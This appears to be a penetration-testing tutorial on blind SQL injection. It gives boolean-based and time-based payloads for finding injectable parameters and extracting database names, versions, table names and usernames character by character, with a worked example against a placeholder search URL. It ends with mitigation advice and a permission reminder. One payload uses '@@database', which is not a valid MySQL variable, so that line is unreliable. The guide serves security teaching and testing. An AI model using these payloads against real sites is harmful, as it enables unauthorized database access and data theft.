# Blind SQL Injection (SQLi) Guide

Blind SQL Injection occurs when an attacker is able to inject SQL queries into an application but cannot directly see the results of those queries. Instead, the attacker must infer the results based on changes in the application's behavior or responses. This type of SQLi can be more challenging to detect and exploit, as it requires careful analysis and understanding of the application's responses to different payloads.

## Steps to Perform Blind SQL Injection

### 1. **Identify Injection Points**
1. **Explore the Application**: Look for input fields, URL parameters, cookies, or HTTP headers that interact with the database. Common targets include search fields, login forms, and URL parameters.
2. **Test for Basic SQL Injection**: Begin by testing these inputs with simple SQL payloads to see if they are injectable. Basic tests include:
     ```SQL
     '
     "
     ' OR '1'='1
     ```

### 2. **Determine Injection Vulnerability**
1. **Test for Error-Based Blind SQLi**: Inject payloads that may cause errors in the application to determine if SQLi is possible. For example:
     ```SQL
     ' AND 1=1--
     ' AND 1=2--
     ```
     If the application behaves differently or displays errors, it indicates a potential SQL injection vulnerability.
2. **Test for Boolean-Based Blind SQLi**: Inject payloads that exploit boolean logic to infer information. For example:
     ```SQL
     ' AND 1=1--
     ' AND 1=2--
     ```
     Compare the responses to determine if the application behaves differently.

### 3. **Extract Data Using Boolean-Based Blind SQLi**

1. **Determine Database Information**: Extract information from the database by using payloads that check conditions. For example, to check if the database name is 'test_db':
     ```SQL
     ' AND (SELECT SUBSTRING(@@database,1,1) = 't')--
     ```
     If the response is different when the condition is true, you can infer the database name.

2. **Extract Database Version**: Use similar methods to extract the database version. Example payload:
     ```SQL
     ' AND (SELECT SUBSTRING(@@version,1,1) = '5')--
     ```

3. **Identify Tables and Columns**:
   - **List Tables**: To determine if a particular table exists:
     ```SQL
     ' AND (SELECT COUNT(*) FROM information_schema.tables WHERE table_name='users') > 0--
     ```
   - **List Columns**: To determine if a specific column exists in a table:
     ```SQL
     ' AND (SELECT COUNT(*) FROM information_schema.columns WHERE table_name='users' AND column_name='username') > 0--
     ```

4. **Extract Data from Tables**: Once you identify tables and columns, use payloads to extract data. For example, to extract the first character of a username:
     ```SQL
     ' AND (SELECT SUBSTRING((SELECT username FROM users LIMIT 1),1,1) = 'a')--
     ```
     Adjust the payload to extract each character of the username.

### 4. **Extract Data Using Time-Based Blind SQLi**

1. **Check for Time Delays**: Use payloads that introduce time delays to infer the existence of certain conditions. For example, to check if the first character of a username is 'a':
     ```SQL
     ' OR IF(SUBSTRING((SELECT username FROM users LIMIT 1),1,1)='a', SLEEP(5), 0)--
     ```
     If the application response is delayed by 5 seconds, you can infer that the condition was true.

2. **Extract Characters**: Use time-based payloads to extract data character by character. For example:
     ```SQL
     ' OR IF(SUBSTRING((SELECT username FROM users LIMIT 1),2,1)='b', SLEEP(5), 0)--
     ```

### 5. **Verify and Document Findings**

1. **Verify Vulnerability**: Confirm that the SQL injection works and that your payloads are correctly extracting or inferring data.
2. **Document Results**: Record details of your findings, including:
   - Injection points and payloads used
   - Data retrieved and its implications
   - Any observed application behavior changes
   - Capture screenshots or save request/response logs as evidence.

3. **Assess Impact**: Evaluate the impact of the SQLi vulnerability based on the data obtained. Consider the sensitivity of the information and potential risks.

4. **Prepare Recommendations**: Provide recommendations for mitigating SQLi vulnerabilities, such as:
   - Using parameterized queries or prepared statements
   - Implementing robust input validation
   - Applying least privilege principles to database accounts
   - Regularly reviewing and updating security measures

## EXAMPLE SCENARIO: Testing a Search Parameter

1. **Identify Injection Point**: Suppose you have a search parameter `q` in the URL, such as `http://target.com/search?q=test`.
2. **Test for Basic SQL Injection**: Try a simple payload to check if the parameter is injectable:
     ```SQL
     http://target.com/search?q=test'
     ```
3. **Determine Injection Vulnerability**: Test for boolean-based SQLi:
     ```SQL
     http://target.com/search?q=test' AND 1=1--
     http://target.com/search?q=test' AND 1=2--
     ```

4. **Extract Database Information**: Use boolean-based queries to infer information:
     ```SQL
     http://target.com/search?q=test' AND (SELECT SUBSTRING(@@version,1,1) = '5')--
     ```

5. **Use Time-Based Blind SQLi**: If the application does not reveal information through boolean-based payloads, try time-based payloads:
     ```SQL
     http://target.com/search?q=test' OR IF(SUBSTRING((SELECT username FROM users LIMIT 1),1,1)='a', SLEEP(5), 0)--
     ```

## Conclusion

Blind SQL Injection involves injecting SQL queries into an application and inferring the results based on application behavior, rather than direct output. By using boolean-based and time-based techniques, you can extract sensitive information even when direct error messages or output are not available.

Always ensure you have explicit permission to perform penetration testing and adhere to ethical guidelines during your assessment.
